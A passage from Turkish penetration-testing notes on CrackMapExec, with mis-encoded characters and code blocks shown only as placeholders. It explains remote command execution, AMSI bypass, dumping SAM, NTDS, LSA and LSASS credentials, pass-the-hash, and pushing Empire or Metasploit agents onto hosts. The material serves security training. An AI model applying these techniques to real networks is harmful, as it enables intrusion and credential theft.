| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
